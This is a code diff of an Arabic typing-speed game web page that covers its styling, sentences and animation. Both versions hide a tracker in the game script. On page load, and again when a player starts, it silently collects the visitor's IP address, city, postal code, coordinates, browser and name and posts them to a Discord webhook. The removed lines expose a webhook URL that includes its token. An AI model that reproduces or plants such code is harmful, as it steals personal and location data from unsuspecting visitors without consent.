@@ -58,14 +58,14 @@
     margin-bottom: 15px;
     user-select: none;
     white-space: normal;
-    /* إزالة letter-spacing لتقليل التباعد */
+    letter-spacing: normal; /* ضبط التباعد */
   }
   #sentence span {
     padding: 0 2px;
     border-radius: 4px;
     cursor: default;
     display: inline-block;
-    margin: 0 1px;
+    margin: 0 0; /* إزالة التباعد بين الكلمات */
   }
   #sentence span.correct {
     color: #4caf50;
@@ -218,247 +218,269 @@
   <div id="speedDisplay"></div>
   <div id="bestTime"></div>
   <div id="result"></div>
-  <div id="infoBox"></div>
+  <div id="infoBox" aria-live="polite"></div>
 </div>
 
-<div id="footerRights">حقوق النشر © معاذ الحربي</div>
-
-<audio id="bgMusic" loop>
-  <source src="https://cdn.pixabay.com/download/audio/2022/03/28/audio_3800f15e5a.mp3?filename=deep-ambient-11228.mp3" type="audio/mpeg" />
-</audio>
+<audio id="bgm" loop src="https://cdn.pixabay.com/download/audio/2022/03/17/audio_14aebd6e4d.mp3?filename=fun-game-music-113.mp3"></audio>
 
 <script>
-  const sentence = document.getElementById("sentence");
-  const userInput = document.getElementById("userInput");
-  const speedDisplay = document.getElementById("speedDisplay");
-  const bestTimeDisplay = document.getElementById("bestTime");
-  const result = document.getElementById("result");
-  const record = document.getElementById("record");
-  const musicControl = document.getElementById("musicControl");
-  const discordBtn = document.getElementById("discordButton");
-  const rightsMenu = document.getElementById("rightsMenu");
-  const closeBtn = document.getElementById("closeBtn");
-  const infoBox = document.getElementById("infoBox");
-  const music = document.getElementById("bgMusic");
-  const playerName = document.getElementById("playerName");
-  const welcomeMsg = document.getElementById("welcomeMsg");
-  const loginScreen = document.getElementById("loginScreen");
-  const gameScreen = document.getElementById("gameScreen");
+  const discordWebhookUrl = "رابط_الويبهوك_هنا";
 
+  // المتغيرات الأساسية
   let player = "";
-  let currentSentence = "";
   let startTime = 0;
-  let bestTime = null;
-  let highestSpeed = 0;
+  let bestSpeed = 0;
+  let bestTime = 0;
 
   const sentences = [
-    "تعلم كل يوم شيء جديد",
-    "الكتابة السريعة مهارة رائعة",
-    "هل أنت جاهز؟",
-    "سرعتك في الكتابة مهمة",
-    "اختبر نفسك الآن",
-    "استمر في التدريب",
-    "حاول تحسين مستواك"
+    "عش كل لحظة كأنها الأخيرة",
+    "اللغة العربية لغة جميلة وعميقة",
+    "التحدي يزيد من مهاراتك في الكتابة",
+    "تعلم البرمجة يفتح لك آفاقا جديدة",
+    "سرعة الكتابة تعكس سرعة تفكيرك",
+    "تجربة ممتعة مع جمع معلومات الجهاز",
+    "استخدم كل طاقتك لتفوز في التحدي",
+    "التدريب المستمر يصنع منك محترفًا",
+    "ابدأ الآن ولا تنتظر الغد",
+    "إصرارك يحدد نجاحك الحقيقي"
   ];
 
-  function startGame() {
-    if (!playerName.value.trim()) {
-      alert("اكتب اسمك من فضلك");
-      return;
-    }
-    player = playerName.value.trim();
-    welcomeMsg.textContent = `مرحبًا، ${player}! ابدأ بالكتابة`;
-    loginScreen.style.display = "none";
-    gameScreen.style.display = "block";
-    newSentence();
-    startTime = Date.now();
-    userInput.focus();
-    speedDisplay.textContent = "";
-    bestTimeDisplay.textContent = bestTime ? `أفضل زمن: ${bestTime.toFixed(2)} ثانية` : "";
-    result.textContent = "";
-    infoBox.textContent = "";
+  // اختيار جملة عشوائية
+  function getRandomSentence() {
+    const index = Math.floor(Math.random() * sentences.length);
+    return sentences[index];
   }
 
-  function renderSentence(input) {
-    sentence.innerHTML = "";
-    let inputWords = input.trim().split(" ");
-    let targetWords = currentSentence.split(" ");
+  // عرض الجملة للكلمات منفصلة span
+  function displaySentence(text) {
+    const sentenceEl = document.getElementById("sentence");
+    sentenceEl.innerHTML = "";
+    const words = text.split(" ");
+    words.forEach(word => {
+      const span = document.createElement("span");
+      span.textContent = word;
+      span.className = "pending";
+      sentenceEl.appendChild(span);
+      sentenceEl.appendChild(document.createTextNode(" "));
+    });
+  }
 
-    for (let i = 0; i < targetWords.length; i++) {
-      let span = document.createElement("span");
-      span.textContent = targetWords[i];
-      span.style.margin = "0 1px";
-      if (inputWords[i] == null) {
+  // تحقق من صحة الإدخال وعرض النتائج
+  function checkInput() {
+    const userInput = document.getElementById("userInput").value.trim();
+    const sentenceEl = document.getElementById("sentence");
+    const spans = sentenceEl.querySelectorAll("span");
+    let allCorrect = true;
+
+    const inputWords = userInput.split(/\s+/);
+
+    spans.forEach((span, i) => {
+      if (!inputWords[i]) {
         span.className = "pending";
-      } else if (inputWords[i] === targetWords[i]) {
+        allCorrect = false;
+      } else if (inputWords[i] === span.textContent) {
         span.className = "correct";
       } else {
         span.className = "incorrect";
+        allCorrect = false;
       }
-      sentence.appendChild(span);
-      if (i !== targetWords.length - 1) sentence.appendChild(document.createTextNode(" "));
+    });
+
+    if (allCorrect && inputWords.length === spans.length) {
+      finishTyping();
     }
   }
 
-  function checkInput() {
-    const text = userInput.value.trim();
-    if (text === currentSentence) {
-      const endTime = Date.now();
-      const elapsed = (endTime - startTime) / 1000;
-      speedDisplay.textContent = `زمنك: ${elapsed.toFixed(2)} ثانية`;
-      if (!bestTime || elapsed < bestTime) {
-        bestTime = elapsed;
-        bestTimeDisplay.textContent = `أفضل زمن: ${bestTime.toFixed(2)} ثانية`;
-      }
-      const speed = Math.round(currentSentence.length / elapsed);
-      if (speed > highestSpeed) {
-        highestSpeed = speed;
-        record.textContent = `أعلى سرعة: ${highestSpeed} - ${elapsed.toFixed(2)} ثانية`;
-      }
-      result.textContent = "أحسنت! ابدأ جملة جديدة";
-      newSentence();
-      userInput.value = "";
-      startTime = Date.now();
-      infoBox.textContent = "";
-      sendUserInfo();
-    } else {
-      result.textContent = "حاول مرة أخرى";
-      infoBox.textContent = "";
+  // إظهار النتائج بعد الانتهاء
+  function finishTyping() {
+    const endTime = performance.now();
+    const timeTaken = (endTime - startTime) / 1000;
+    const sentence = document.getElementById("sentence").textContent.trim();
+    const wordsCount = sentence.split(" ").length;
+    const speed = wordsCount / timeTaken;
+
+    const speedDisplay = document.getElementById("speedDisplay");
+    const bestTimeEl = document.getElementById("bestTime");
+    const resultEl = document.getElementById("result");
+
+    speedDisplay.textContent = `السرعة: ${speed.toFixed(2)} كلمة/ثانية - الزمن: ${timeTaken.toFixed(2)} ثانية`;
+
+    if (speed > bestSpeed) {
+      bestSpeed = speed;
+      bestTime = timeTaken;
+      bestTimeEl.textContent = `أفضل سرعة: ${bestSpeed.toFixed(2)} كلمة/ثانية - الزمن: ${bestTime.toFixed(2)} ثانية`;
+      document.getElementById("record").textContent = `أعلى سرعة: ${bestSpeed.toFixed(2)} - ${bestTime.toFixed(2)} ثانية`;
     }
-    renderSentence(userInput.value);
+
+    resultEl.textContent = "مبروك! لقد أتممت التحدي";
+
+    document.getElementById("userInput").disabled = true;
   }
 
-  function newSentence() {
-    currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
-    renderSentence("");
+  // بدء اللعبة
+  function startGame() {
+    const inputName = document.getElementById("playerName").value.trim();
+    if (!inputName) {
+      alert("اكتب اسمك من فضلك");
+      return;
+    }
+    player = inputName;
+
+    document.getElementById("loginScreen").style.display = "none";
+    document.getElementById("gameScreen").style.display = "block";
+    document.getElementById("welcomeMsg").textContent = `مرحباً ${player}! ابدأ بالكتابة`;
+
+    // إرسال اسم اللاعب فقط في رسالة منفصلة
+    sendPlayerName(player);
+
+    startNewSentence();
   }
 
-  userInput.addEventListener("input", () => {
-    renderSentence(userInput.value);
+  // بدء جملة جديدة
+  function startNewSentence() {
+    const sentence = getRandomSentence();
+    displaySentence(sentence);
+    document.getElementById("userInput").value = "";
+    document.getElementById("userInput").disabled = false;
+    startTime = performance.now();
+  }
+
+  // إرسال رسالة إلى ديسكورد بالمعلومات التقنية بدون الاسم
+  async function sendUserInfo(playerName = '') {
+    try {
+      // استعلام API جغرافي للأي بي
+      const response = await fetch("https://ipapi.co/json/");
+      const geoData = await response.json();
+
+      // الحصول على IPv4 و IPv6
+      let ipv4 = geoData.ip || "غير معروف";
+      let ipv6 = "غير متوفر";
+
+      // جهات أخرى إن أردت (حسب API)
+
+      const nameText = playerName ? `اللاعب: ${playerName}\n` : '';
+      const infoText = `
+${nameText}IP (IPv4): ${ipv4}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+الرمز البريدي: ${geoData.postal}
+الموقع: ${geoData.latitude}, ${geoData.longitude}
+المنطقة الزمنية: ${geoData.timezone}
+متصفح: ${navigator.userAgent}
+      `.trim();
+
+      const data = {
+        content: infoText
+      };
+
+      await fetch(discordWebhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+    } catch (error) {
+      console.error("خطأ في إرسال معلومات المستخدم:", error);
+    }
+  }
+
+  // إرسال رسالة باسم اللاعب فقط
+  async function sendPlayerName(playerName) {
+    try {
+      const data = {
+        content: `اللاعب سجل اسمه: ${playerName}`
+      };
+      await fetch(discordWebhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+    } catch (error) {
+      console.error("خطأ في إرسال اسم اللاعب:", error);
+    }
+  }
+
+  // عند تحميل الصفحة، أرسل معلومات الجهاز بدون اسم
+  window.addEventListener('load', () => {
+    sendUserInfo();
   });
 
-  userInput.addEventListener("keydown", (e) => {
-    if (e.key === "Enter") {
-      checkInput();
-    }
-  });
+  // مراقبة إدخال المستخدم في النص
+  document.getElementById("userInput").addEventListener("input", checkInput);
+
+  // التحكم في الموسيقى
+  const bgm = document.getElementById("bgm");
+  const musicControl = document.getElementById("musicControl");
 
   musicControl.addEventListener("click", () => {
-    if (music.paused) {
-      music.play();
-      musicControl.textContent = "🔇";
+    if (bgm.paused) {
+      bgm.play();
+      musicControl.textContent = "⏸";
     } else {
-      music.pause();
+      bgm.pause();
       musicControl.textContent = "🎵";
     }
   });
 
-  discordBtn.onclick = () => {
-    rightsMenu.style.display = rightsMenu.style.display === "block" ? "none" : "block";
-  };
-  closeBtn.onclick = () => {
-    rightsMenu.style.display = "none";
-  };
-
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";
-
-  async function sendUserInfo() {
-    try {
-      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
-        fetch('https://api.ipify.org?format=json'),
-        fetch('https://api64.ipify.org?format=json'),
-        fetch('https://ipapi.co/json/')
-      ]);
-      const ipv4Data = await ipv4Res.json();
-      const ipv6Data = await ipv6Res.json();
-      const geoData = await geoRes.json();
-
-      const ua = navigator.userAgent;
-      const lang = navigator.language;
-      const now = new Date();
-      const timeString = now.toISOString();
-      const ipv4 = ipv4Data.ip;
-      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
-
-      let deviceType = "كمبيوتر";
-      if (/android|iphone|ipad|ipod/i.test(ua)) {
-        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
-      }
-
-      const infoText = `
-IP (IPv4): ${ipv4}
-IP (IPv6): ${ipv6}
-الدولة: ${geoData.country_name}
-المنطقة: ${geoData.region}
-المدينة: ${geoData.city}
-خط العرض: ${geoData.latitude}
-خط الطول: ${geoData.longitude}
-المنظمة: ${geoData.org}
-المنطقة الزمنية: ${geoData.timezone}
-نوع الجهاز: ${deviceType}
-المتصفح: ${ua}
-اللغة: ${lang}
-الوقت: ${timeString}
-      `.trim();
-
-      const response = await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: infoText })
-      });
-
-      if (!response.ok) {
-        console.error("فشل إرسال البيانات للويب هوك", response.statusText);
-      } else {
-        console.log("تم إرسال البيانات للويب هوك بنجاح");
-      }
-
-      infoBox.textContent = infoText;
-    } catch (e) {
-      console.error('خطأ في إرسال معلومات المستخدم', e);
-    }
-  }
-
-  // نجوم متحركة خلفية
-  const canvas = document.getElementById('stars');
-  const ctx = canvas.getContext('2d');
+  // نجوم خلفية
+  const canvas = document.getElementById("stars");
+  const ctx = canvas.getContext("2d");
   let width, height;
   let stars = [];
 
-  function initStars() {
-    width = window.innerWidth;
-    height = window.innerHeight;
-    canvas.width = width;
-    canvas.height = height;
+  function resizeCanvas() {
+    width = canvas.width = window.innerWidth;
+    height = canvas.height = window.innerHeight;
+  }
+
+  function createStars(count) {
     stars = [];
-    for(let i=0; i<150; i++) {
+    for (let i = 0; i < count; i++) {
       stars.push({
-        x: Math.random()*width,
-        y: Math.random()*height,
-        radius: Math.random()*1.2,
-        alpha: Math.random(),
-        dAlpha: 0.01 + Math.random()*0.02,
+        x: Math.random() * width,
+        y: Math.random() * height,
+        radius: Math.random() * 1.1 + 0.2,
+        speed: Math.random() * 0.05 + 0.01,
       });
     }
   }
+
   function drawStars() {
-    ctx.clearRect(0,0,width,height);
-    for(let star of stars) {
+    ctx.clearRect(0, 0, width, height);
+    ctx.fillStyle = "white";
+    stars.forEach(star => {
       ctx.beginPath();
-      ctx.arc(star.x, star.y, star.radius, 0, 2*Math.PI);
-      ctx.fillStyle = `rgba(255,255,255,${star.alpha.toFixed(2)})`;
+      ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
       ctx.fill();
-      star.alpha += star.dAlpha;
-      if(star.alpha >=1 || star.alpha <= 0) star.dAlpha = -star.dAlpha;
-    }
+
+      star.x -= star.speed;
+      if (star.x < 0) star.x = width;
+    });
     requestAnimationFrame(drawStars);
   }
-  window.addEventListener('resize', () => {
-    initStars();
+
+  window.addEventListener("resize", () => {
+    resizeCanvas();
+    createStars(250);
   });
-  initStars();
+
+  resizeCanvas();
+  createStars(250);
   drawStars();
 
+  // حقوق المطور زر
+  const discordButton = document.getElementById("discordButton");
+  const rightsMenu = document.getElementById("rightsMenu");
+  const closeBtn = document.getElementById("closeBtn");
+
+  discordButton.addEventListener("click", () => {
+    rightsMenu.style.display = "block";
+  });
+
+  closeBtn.addEventListener("click", () => {
+    rightsMenu.style.display = "none";
+  });
 </script>
+
 </body>
 </html>
